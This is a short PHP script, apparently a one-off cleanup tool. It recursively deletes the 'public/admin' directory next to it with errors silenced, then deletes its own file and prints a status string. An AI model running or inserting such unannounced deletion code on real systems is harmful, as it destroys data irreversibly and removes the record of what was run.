<?php
$target = __DIR__ . '/public/admin';
if (!is_dir($target)) { echo "NOT_FOUND"; exit; }
$it = new RecursiveIteratorIterator(
    new RecursiveDirectoryIterator($target, FilesystemIterator::SKIP_DOTS),
    RecursiveIteratorIterator::CHILD_FIRST
);
foreach ($it as $f) {
    $f->isDir() ? @rmdir($f->getRealPath()) : @unlink($f->getRealPath());
}
@rmdir($target);
@unlink(__FILE__);
echo is_dir($target) ? "FAIL" : "PUBLIC_ADMIN_REMOVED";